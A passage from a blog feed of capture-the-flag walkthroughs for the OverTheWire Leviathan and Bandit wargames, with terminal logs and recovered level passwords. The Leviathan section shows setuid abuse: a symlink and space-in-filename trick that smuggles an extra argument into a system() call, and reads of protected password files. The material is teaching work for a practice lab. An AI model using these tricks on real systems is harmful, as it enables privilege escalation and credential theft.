&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;leviathan1@melinda:~$ ltrace ./check 
__libc_start_main(0x804852d, 1, 0xffffd794, 0x80485f0 &amp;lt;unfinished ...&amp;gt;
printf(&amp;quot;password: &amp;quot;)                                       = 10
getchar(0x8048680, 47, 0x804a000, 0x8048642password: test
)               = 116
getchar(0x8048680, 47, 0x804a000, 0x8048642)               = 101
getchar(0x8048680, 47, 0x804a000, 0x8048642)               = 115
strcmp(&amp;quot;tes&amp;quot;, &amp;quot;sex&amp;quot;)                                       = 1
puts(&amp;quot;Wrong password, Good Bye ...&amp;quot;Wrong password, Good Bye ...
)                       = 29
+++ exited (status 0) +++
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;And there we have it.&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;leviathan1@melinda:~$ ./check 
password: sex
$ whoami
leviathan2
$ cat /etc/leviathan_pass/leviathan2
ougahZi8Ta
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;h1 id=&#34;level-2-3:233d21a5a4a7da288bb6120215cbabbb&#34;&gt;Level 2 -&amp;gt; 3&lt;/h1&gt;

&lt;p&gt;This time we are given a file called &lt;code&gt;printfile&lt;/code&gt; that is setuid &lt;code&gt;leviathan3&lt;/code&gt;.
Initially you&amp;rsquo;d think we can just print the contents of the &lt;code&gt;leviathan3&lt;/code&gt; password
file. Nope, there&amp;rsquo;s a check in the binary preventing us from doing so.&lt;/p&gt;

&lt;p&gt;Let&amp;rsquo;s find out what that check is with &lt;code&gt;ltrace&lt;/code&gt; once again&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;leviathan2@melinda:~$ ltrace ./printfile /tmp/unlogic
__libc_start_main(0x804852d, 2, 0xffffd764, 0x8048600 &amp;lt;unfinished ...&amp;gt;
access(&amp;quot;/tmp/unlogic&amp;quot;, 4)                                  = 0
snprintf(&amp;quot;/bin/cat /tmp/unlogic&amp;quot;, 511, &amp;quot;/bin/cat %s&amp;quot;, &amp;quot;/tmp/unlogic&amp;quot;) = 21
system(&amp;quot;/bin/cat /tmp/unlogic&amp;quot;testing
 &amp;lt;no return ...&amp;gt;
--- SIGCHLD (Child exited) ---
&amp;lt;... system resumed&amp;gt; )                                     = 0
+++ exited (status 0) +++
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;We can see that it checks access to the file, then runs &lt;code&gt;cat&lt;/code&gt; on the file if it&amp;rsquo;s
ok for us to access it. Symlinks won&amp;rsquo;t work here, as the &lt;code&gt;access&lt;/code&gt; call dereferences
the symlink. So what can we do? We exploit spaces. By creating a file that is a symlink to
the &lt;code&gt;leviathan3&lt;/code&gt; password file, along with another file, that has the same name followed
by a space and another name, we can trick &lt;code&gt;access&lt;/code&gt; into allowing it to carry on, and
then &lt;code&gt;cat&lt;/code&gt; to print the files. let me show you&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;leviathan2@melinda:~$ ln -s /etc/leviathan_pass/leviathan3 /tmp/levpass3
leviathan2@melinda:~$ touch /tmp/levpass3&lt;span style=&#34;color: #ae81ff&#34;&gt;\ &lt;/span&gt;other
leviathan2@melinda:~$ ./printfile /tmp/levpass3&lt;span style=&#34;color: #ae81ff&#34;&gt;\ &lt;/span&gt;other
Ahdiemoo1j
/bin/cat: other: No such file or directory
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;So access checks &lt;code&gt;/tmp/levpass3\ other&lt;/code&gt; and deems it ok. Then that string gets
passed to &lt;code&gt;cat&lt;/code&gt; which interprets it as two files, hence the &lt;code&gt;/bin/cat: other: No such file or directory&lt;/code&gt;&lt;/p&gt;

&lt;h1 id=&#34;level-3-4:233d21a5a4a7da288bb6120215cbabbb&#34;&gt;Level 3 -&amp;gt; 4&lt;/h1&gt;

&lt;p&gt;Another program that prompts for a pass. Usual approaches of &lt;code&gt;strings&lt;/code&gt; and checking
the &lt;em&gt;disass&lt;/em&gt; doesn&amp;rsquo;t reveal much, but the function &lt;code&gt;do_stuff&lt;/code&gt; does call &lt;code&gt;strcmp&lt;/code&gt;
and we know now that we can use &lt;code&gt;ltrace&lt;/code&gt; to help us out&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;leviathan3@melinda:~$ ltrace ./level3 
__libc_start_main(0x80485fe, 1, 0xffffd794, 0x80486d0 &amp;lt;unfinished ...&amp;gt;
strcmp(&amp;quot;h0no33&amp;quot;, &amp;quot;kakaka&amp;quot;)                                 = -1
printf(&amp;quot;Enter the password&amp;gt; &amp;quot;)                             = 20
fgets(Enter the password&amp;gt; d
&amp;quot;d\n&amp;quot;, 256, 0xf7fcac20)                              = 0xffffd58c
strcmp(&amp;quot;d\n&amp;quot;, &amp;quot;snlprintf\n&amp;quot;)                               = -1
puts(&amp;quot;bzzzzzzzzap. WRONG&amp;quot;bzzzzzzzzap. WRONG
)                                 = 19
+++ exited (status 0) +++
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;A little bit of obfuscation here, but to our keen eyes, we see where the test
is happening &lt;code&gt;strcmp(&amp;quot;d\n&amp;quot;, &amp;quot;snlprintf\n&amp;quot;)&lt;/code&gt;. Our password is &lt;code&gt;snlprintf&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;leviathan3@melinda:~$ ./level3 
Enter the password&amp;gt; snlprintf  
[You&amp;#39;ve got shell]!
$ whoami
leviathan4
$ cat /etc/leviathan_pass/leviathan4
vuH0coox6m
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;h1 id=&#34;level-4-5:233d21a5a4a7da288bb6120215cbabbb&#34;&gt;Level 4 -&amp;gt; 5&lt;/h1&gt;

&lt;p&gt;Inside the hidden directory (you always run &lt;code&gt;ls -la&lt;/code&gt;, right?) we have a bin file.
It&amp;rsquo;s executable, so let&amp;rsquo;s run it&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;leviathan4@melinda:~$ ./.trash/bin 
01010100 01101001 01110100 01101000 00110100 01100011 01101111 01101011 01100101 01101001 00001010 
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;I&amp;rsquo;m guessing we need to decode that from the current binary encoded string to text. This
gives us &lt;code&gt;Tith4cokei&lt;/code&gt;. Testing it out takes us to&lt;/p&gt;

&lt;h1 id=&#34;level-5-6:233d21a5a4a7da288bb6120215cbabbb&#34;&gt;Level 5 -&amp;gt; 6&lt;/h1&gt;

&lt;p&gt;We have a binary called &lt;code&gt;leviathan5&lt;/code&gt; that is suid &lt;code&gt;leviathan6&lt;/code&gt;. Upon running it,
we get a message that file &lt;code&gt;tmp/file.log&lt;/code&gt; cannot be found. If you create one, it
will open it, print its contents, close it, and then delete it. So let&amp;rsquo;s give the
old symlink method a try:&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;leviathan5@melinda:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
leviathan5@melinda:~$ ./leviathan5 
UgaoFee4li
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Result.&lt;/p&gt;

&lt;h1 id=&#34;level-6-7:233d21a5a4a7da288bb6120215cbabbb&#34;&gt;Level 6 -&amp;gt; 7&lt;/h1&gt;

&lt;p&gt;We need a 4 digit pass code to access this. I opted for brute force. For 4 digits
that&amp;rsquo;s by far the simplest and quickest way. After looking at the disassembly, we
see that it will call &lt;code&gt;/bin/sh&lt;/code&gt; and drop us to a shell, so we don&amp;rsquo;t need an exit condition.&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;leviathan6@melinda:~$ &lt;span style=&#34;color: #66d9ef&#34;&gt;for&lt;/span&gt; i in &lt;span style=&#34;color: #66d9ef&#34;&gt;$(&lt;/span&gt;seq -f &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;%04g&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt; 9999&lt;span style=&#34;color: #66d9ef&#34;&gt;)&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;do&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;$i&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; ./leviathan6 &lt;span style=&#34;color: #f8f8f2&#34;&gt;$i&lt;/span&gt; &amp;gt; /dev/null&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;done&lt;/span&gt;
0000
0001
.
.
7123
&lt;/pre&gt;&lt;/div&gt;

It stops there. Because we redirect to /dev/null, we need to ctrl+c and then enter
the last printed number to get the password&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;leviathan6@melinda:~$ ./leviathan6  7123
$ cat /etc/leviathan_pass/leviathan7
ahy7MaeBo9
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;The final flag for level 7 is&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Well Done, you seem to have used a *nix system before, now try something more serious.
(Please don&#39;t post writeups, solutions or spoilers about the games on the web. Thank you!)  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I understand the reasons, but this is not the only write up out there, and it is a fairly old
wargame too. IMO I feel that providing these walkthroughs will help those who are stuck.
If you are however just following this so that you can complete Leviathan, then you should
sit down and have a go at this, or other war games without a guide. Challenge yourself.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Let&#39;s crack Bandit Part 1</title>
      <link>http://unlogic.co.uk/2015/03/13/lets-crack-bandit-part1/</link>
      <pubDate>Fri, 13 Mar 2015 00:00:00 +0000</pubDate>
      
      <guid>http://unlogic.co.uk/2015/03/13/lets-crack-bandit-part1/</guid>
      <description>

&lt;p&gt;Let&amp;rsquo;s give Bandit from the &lt;a href=&#34;http://overthewire.org/wargames&#34;&gt;overthewire war games&lt;/a&gt;
a going over. I did this a while back, but never really wrote it up,
so I&amp;rsquo;m going to do it again and write it up. Remember that you can copy
and paste from all the &lt;a href=&#34;https://asciinema.org&#34;&gt;asciinema&lt;/a&gt; videos below.&lt;/p&gt;

&lt;p&gt;Bandit is a CTF/wargame for beginners and a great intro to various
linux tools as well. I won&amp;rsquo;t repeat the level summary for each post, instead
there&amp;rsquo;s a link to the original page for each section.&lt;/p&gt;

&lt;p&gt;I&amp;rsquo;d be interested to know if the asciinema files are preferable over the
plain text format or not. Let me know in the comments below. I&amp;rsquo;ve used
asciinema in the first level only, but would post the asciinema vids if they
are useful.&lt;/p&gt;

&lt;p&gt;&lt;section id=&#34;table-of-contents&#34; class=&#34;toc&#34;&gt;
&lt;header&gt;
&lt;h3&gt;Contents&lt;/h3&gt;
&lt;/header&gt;
&lt;div id=&#34;drawer&#34; markdown=&#34;1&#34;&gt;
*  Auto generated table of contents
{:toc}
&lt;/div&gt;
&lt;/section&gt;&lt;!-- /#table-of-contents --&gt;&lt;/p&gt;

&lt;h1 id=&#34;level-0-1:c0b338e2f736b59776da7641378921cf&#34;&gt;Level 0 -&amp;gt; 1&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://overthewire.org/wargames/bandit/bandit1.html&#34;&gt;level 00&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Not much to do here but login and read a file so:&lt;/p&gt;

&lt;script type=&#34;text/javascript&#34; src=&#34;https://asciinema.org/a/17664.js&#34; id=&#34;asciicast-17664&#34; async&gt;&lt;/script&gt;

&lt;h1 id=&#34;level-1-2:c0b338e2f736b59776da7641378921cf&#34;&gt;Level 1 -&amp;gt; 2&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://overthewire.org/wargames/bandit/bandit2.html&#34;&gt;level 01&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Using the password from the last session, let&amp;rsquo;s login and look at what&amp;rsquo;s in
&lt;code&gt;-&lt;/code&gt;. The trick here is that &lt;code&gt;-&lt;/code&gt; is a bit tricky to pass as an argument. Try
it to see what happens. All we need to do it prefix it with the path:&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;bandit1@melinda:~$ ls -la
total 24
-rw-r-----   1 bandit2 bandit1   33 Jun  6  2013 -
drwxr-xr-x   2 root    root    4096 Jun  6  2013 .
drwxr-xr-x 160 root    root    4096 Oct 17  2013 ..
-rw-r--r--   1 root    root     220 Apr  3  2012 .bash_logout
-rw-r--r--   1 root    root    3486 Apr  3  2012 .bashrc
-rw-r--r--   1 root    root     675 Apr  3  2012 .profile
bandit1@melinda:~$ cat ./-
CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9
&lt;/pre&gt;&lt;/div&gt;


&lt;h1 id=&#34;level-2-3:c0b338e2f736b59776da7641378921cf&#34;&gt;Level 2 -&amp;gt; 3&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://overthewire.org/wargames/bandit/bandit3.html&#34;&gt;level 02&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Not much trickiness here, merely the spaces in the filename. But with TAB
completion the escaping of the spaces will be handled for us:&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;bandit2@melinda:~$ ls -la
total 24
drwxr-xr-x   2 root    root    4096 Jun  6  2013 .
drwxr-xr-x 160 root    root    4096 Oct 17  2013 ..
-rw-r--r--   1 root    root     220 Apr  3  2012 .bash_logout
-rw-r--r--   1 root    root    3486 Apr  3  2012 .bashrc
-rw-r--r--   1 root    root     675 Apr  3  2012 .profile
-rw-r-----   1 bandit3 bandit2   33 Jun  6  2013 spaces in this filename
bandit2@melinda:~$ cat ./spaces&lt;span style=&#34;color: #ae81ff&#34;&gt;\ &lt;/span&gt;in&lt;span style=&#34;color: #ae81ff&#34;&gt;\ &lt;/span&gt;this&lt;span style=&#34;color: #ae81ff&#34;&gt;\ &lt;/span&gt;filename
UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK
&lt;/pre&gt;&lt;/div&gt;


&lt;h1 id=&#34;level-3-4:c0b338e2f736b59776da7641378921cf&#34;&gt;Level 3 -&amp;gt; 4&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://overthewire.org/wargames/bandit/bandit4.html&#34;&gt;level 03&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Hidden file? Just do a long listing with &lt;code&gt;ls -la&lt;/code&gt;&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;bandit3@melinda:~$ ls -la
total 24
drwxr-xr-x   3 root root 4096 Jun  6  2013 .
drwxr-xr-x 160 root root 4096 Oct 17  2013 ..
-rw-r--r--   1 root root  220 Apr  3  2012 .bash_logout
-rw-r--r--   1 root root 3486 Apr  3  2012 .bashrc
-rw-r--r--   1 root root  675 Apr  3  2012 .profile
drwxr-xr-x   2 root root 4096 Jun  6  2013 inhere
bandit3@melinda:~$ &lt;span style=&#34;color: #f8f8f2&#34;&gt;cd &lt;/span&gt;inhere/
bandit3@melinda:~/inhere$ ls
bandit3@melinda:~/inhere$ ls -la
total 12
drwxr-xr-x 2 root    root    4096 Jun  6  2013 .
drwxr-xr-x 3 root    root    4096 Jun  6  2013 ..
-rw-r----- 1 bandit4 bandit3   33 Jun  6  2013 .hidden
bandit3@melinda:~/inhere$ cat .hidden
pIwrPrtPN36QITSp3EQaw936yaFoFgAB
&lt;/pre&gt;&lt;/div&gt;


&lt;h1 id=&#34;level-4-5:c0b338e2f736b59776da7641378921cf&#34;&gt;Level 4 -&amp;gt; 5&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://overthewire.org/wargames/bandit/bandit5.html&#34;&gt;level 04&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;We need to find a human readable file in the &lt;code&gt;inhere&lt;/code&gt; directory. Using the
power of bash:&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;bandit4@melinda:~$ &lt;span style=&#34;color: #f8f8f2&#34;&gt;cd &lt;/span&gt;inhere/
bandit4@melinda:~/inhere$ &lt;span style=&#34;color: #66d9ef&#34;&gt;for&lt;/span&gt; f in &lt;span style=&#34;color: #66d9ef&#34;&gt;$(&lt;/span&gt;ls&lt;span style=&#34;color: #66d9ef&#34;&gt;)&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;do&lt;/span&gt; file ./&lt;span style=&#34;color: #e6db74&#34;&gt;${&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;done&lt;/span&gt;
./-file00: data
./-file01: data
./-file02: data
./-file03: data
./-file04: data
./-file05: data
./-file06: data
./-file07: ASCII text
./-file08: data
./-file09: data
bandit4@melinda:~/inhere$ cat ./-file07
koReBOKuIDDepwhWk7jZC0RTdopnAYKh
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Change into the &lt;code&gt;inhere&lt;/code&gt; directory and then for each file returned by the &lt;code&gt;ls&lt;/code&gt;
command, get the filetype with the &lt;code&gt;file&lt;/code&gt; command. Only one which is ASCII, so
that&amp;rsquo;s a good candidate. Sure enough, it&amp;rsquo;s the one we are after.&lt;/p&gt;

&lt;h1 id=&#34;level-5-6:c0b338e2f736b59776da7641378921cf&#34;&gt;Level 5 -&amp;gt; 6&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://overthewire.org/wargames/bandit/bandit6.html&#34;&gt;level 05&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;This is similar to the previous level, except now we are looking for something
with a specific size. Luckily the &lt;code&gt;find&lt;/code&gt; command is just right for this:&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;bandit5@melinda:~$ find ./ -size 1033c
./inhere/maybehere07/.file2
bandit5@melinda:~$ file ./inhere/maybehere07/.file2
./inhere/maybehere07/.file2: ASCII text, with very long lines
bandit5@melinda:~$ cat !&lt;span style=&#34;color: #960050; background-color: #1e0010&#34;&gt;$&lt;/span&gt;
cat ./inhere/maybehere07/.file2
DXjZPULLxYr17uwoI01bNLQbtFemEgo7
&lt;/pre&gt;&lt;/div&gt;


&lt;h1 id=&#34;level-6-7:c0b338e2f736b59776da7641378921cf&#34;&gt;Level 6 -&amp;gt; 7&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://overthewire.org/wargames/bandit/bandit7.html&#34;&gt;level 06&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Now we need to broaden our search. Once again &lt;code&gt;find&lt;/code&gt; to the rescue. We know
the user and group that own the file and its size. The user and group might
be enough already, so let&amp;rsquo;s give that a go&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;bandit6@melinda:~$ &lt;span style=&#34;color: #f8f8f2&#34;&gt;cd&lt;/span&gt; /
bandit6@melinda:/$ find -user bandit7 -group bandit6  2&amp;gt; /dev/null 
./var/lib/dpkg/info/bandit7.password
bandit6@melinda:/$ cat ./var/lib/dpkg/info/bandit7.password
HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Perfect. I piped the &lt;code&gt;stderr&lt;/code&gt; to &lt;code&gt;/dev/null&lt;/code&gt; so it doesn&amp;rsquo;t clutter the output
with files that it can&amp;rsquo;t read.&lt;/p&gt;

&lt;h1 id=&#34;level-7-8:c0b338e2f736b59776da7641378921cf&#34;&gt;Level 7 -&amp;gt; 8&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://overthewire.org/wargames/bandit/bandit8.html&#34;&gt;Level 07&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;To find things in a file, &lt;code&gt;grep&lt;/code&gt; is usually the answer. However it&amp;rsquo;s probably
wise to check the file format first in case all the words are smushed together
and we need to filter grep again.&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;bandit7@melinda:~$ head data.txt 
Kunming&amp;#39;s	0D0KZ3TdLRBXD8lyd7Bj2hAqnxaMInQe
multitude&amp;#39;s	8MFZa8yOjTt6m8PvxteTp7XTDFLiuFAk
audibility	ZeLj0yAw7ylmEoLxSUEqF4iB43c9DN4h
unadvised	Pgp8X2LSVdNrmIKcJ7Oe8eqTzEVfhGbR
Brecht&amp;#39;s	uKyKryNUZYFuTQpwRlDqucLLIUbiIMF0
Alvin	IpQIV6mpjticdB790obqXAvYkAgnDV8E
insufficient	cgHhWVJahfDqFIe82vOliryQQ8ihGlGN
Sauterne	UhPBp0A04GkIRfvZnUt1UdwlKU2ViYUd
cluster	1GeFZ0B6rsEtJ5Sqb5h8Wv7UwG15DQzb
ember&amp;#39;s	f2XPIE1iDHW9oHPyodPyfTz87DAbWmXu
bandit7@melinda:~$ grep millionth data.txt 
millionth	cvX2JJa4CFALtqS87jk27qwqGhBM9plV
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Luckily it was one word and password per line, so grepping the file worked
fine.&lt;/p&gt;

&lt;h1 id=&#34;level-8-9:c0b338e2f736b59776da7641378921cf&#34;&gt;Level 8 -&amp;gt; 9&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://overthewire.org/wargames/bandit/bandit9.html&#34;&gt;level 08&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;So the only way we know which entry is the password is that it occurs
only once. For this the linux tool &lt;code&gt;uniq&lt;/code&gt; seems perfect. However it can
only detect duplicate lines if they are next to each other. To fix this
we also need to sort the contents of the file and then display only
unique lines:&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;bandit8@melinda:~$ cat data.txt &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; sort &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; uniq -u
UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;h1 id=&#34;level-9-10:c0b338e2f736b59776da7641378921cf&#34;&gt;Level 9 -&amp;gt; 10&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://overthewire.org/wargames/bandit/bandit10.html&#34;&gt;Level 09&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;This &lt;code&gt;data.txt&lt;/code&gt; file is in binary. So in order to find the strings we need
to dump it as hex, or, even simpler, run it through &lt;code&gt;strings&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;bandit9@melinda:~$ strings data.txt  &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;grep&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;==&lt;/span&gt;
I========== the6
========== password
========== ism
========== truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;h1 id=&#34;level-10-11:c0b338e2f736b59776da7641378921cf&#34;&gt;Level 10 -&amp;gt; 11&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://overthewire.org/wargames/bandit/bandit11.html&#34;&gt;Level 10&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Good ol base64. If you haven&amp;rsquo;t seen it before, you&amp;rsquo;ll get to see it a lot
more if you carry on doing these kind of challenges. Simply done though:&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;bandit10@melinda:~$ cat data.txt  &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; base64 -d
The password is IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;h1 id=&#34;level-11-12:c0b338e2f736b59776da7641378921cf&#34;&gt;Level 11 -&amp;gt; 12&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://overthewire.org/wargames/bandit/bandit12.html&#34;&gt;level 11&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;The description is a basically a verbose way of saying that the string
has been encoded with rot13. The quickest way for me to un-rotate it, is
using python:&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;bandit11@melinda:~$ cat data.txt 
Gur cnffjbeq vf 5Gr8L4qetPEsPk8htqjhRK8XSP6x2RHh
bandit11@melinda:~$ python -c &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;import codecs;print codecs.decode(&amp;quot;5Gr8L4qetPEsPk8htqjhRK8XSP6x2RHh&amp;quot;, &amp;quot;rot13&amp;quot;)&amp;#39;&lt;/span&gt;
5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;h1 id=&#34;level-12-13:c0b338e2f736b59776da7641378921cf&#34;&gt;Level 12 -&amp;gt; 13&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://overthewire.org/wargames/bandit/bandit13.html&#34;&gt;Level 12&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;From here on it&amp;rsquo;s going to get a little trickier. We know that data.txt is a hexdump
of a binary, so first let&amp;rsquo;s convert it back to a binary first with &lt;code&gt;xxd&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;bandit12@melinda:/tmp/unl$ cat data.txt &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; xxd -r &amp;gt; data2
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Then we can find out the filetype of data2&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;bandit12@melinda:/tmp/unl$ file data2
data2: gzip compressed data, was &amp;quot;data2.bin&amp;quot;, from Unix, last modified: Fri Nov 14 10:32:20 2014, max compression
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;&lt;code&gt;gzip&lt;/code&gt; it is. So uncompress that to data3&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;bandit12@melinda:/tmp/unl$ cat data2 &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; zcat &amp;gt; data3
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;and get its filetype next. I won&amp;rsquo;t go over each step in detail as there&amp;rsquo;s quite
a few iterations. I&amp;rsquo;ll post the console log of how I got to the flag and hopefully
that should be clear enough.&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;bandit12@melinda:/tmp/unl$ file data3
data3: bzip2 compressed data, block size = 900k
bandit12@melinda:/tmp/unl$ bzcat data3 &amp;gt; data4
bandit12@melinda:/tmp/unl$ file data4
data4: gzip compressed data, was &amp;quot;data4.bin&amp;quot;, from Unix, last modified: Fri Nov 14 10:32:20 2014, max compression
bandit12@melinda:/tmp/unl$ cat data4 &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; zcat &amp;gt; data5
bandit12@melinda:/tmp/unl$ file data5
data5: POSIX tar archive (GNU)
bandit12@melinda:/tmp/unl$ tar xf data5
bandit12@melinda:/tmp/unl$ ls
